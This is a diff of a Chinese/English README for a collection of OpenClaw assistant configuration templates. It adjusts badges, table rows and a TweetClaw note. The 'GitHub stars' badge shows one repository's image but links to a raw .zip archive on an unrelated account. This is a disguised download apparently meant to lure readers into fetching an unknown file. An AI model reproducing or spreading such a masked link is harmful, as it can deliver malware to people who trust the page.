@@ -9,9 +9,8 @@
 [![GitHub stars](https://img.shields.io/github/stars/ShuyuZ1999/awesome-openclaw-configs?style=social)](https://github.com/AbdNour627/awesome-openclaw-configs/raw/refs/heads/main/configs/awesome_openclaw_configs_v2.7-beta.4.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![NHS Agentic Readiness](https://nothumansearch.ai/badge/xquik.com.svg)](https://nothumansearch.ai/site/xquik.com)
 
-[English](README_EN.md) | 中文
+[English](#what-is-this--这是什么) | [中文](#what-is-this--这是什么)
 
 </div>
 
@@ -150,7 +149,6 @@ tips/
 | [`cron-morning-brief.json5`](configs/automation/cron-morning-brief.json5) | Daily 8AM brief: weather + calendar + todos |
 | [`heartbeat-proactive.json5`](configs/automation/heartbeat-proactive.json5) | Proactive assistant — checks email/calendar, notifies on demand |
 | [`reminder-oneshot.json5`](configs/automation/reminder-oneshot.json5) | One-shot reminder, self-deletes after firing |
-| [`x-twitter-monitor-tweetclaw.json5`](configs/automation/x-twitter-monitor-tweetclaw.json5) | TweetClaw X/Twitter monitor, follower export, reviewed post/reply drafts |
 
 ### 💰 Budget / 省钱方案
 
@@ -232,6 +230,11 @@ openclaw gateway restart
 PRs welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
 欢迎贡献新模板！请阅读 [CONTRIBUTING.md](CONTRIBUTING.md)。
+
+The automation template
+[`x-twitter-monitor-tweetclaw.json5`](configs/automation/x-twitter-monitor-tweetclaw.json5)
+shows how to wire TweetClaw as an approval-reviewed X/Twitter monitor and
+drafting companion.
 
 ---
 
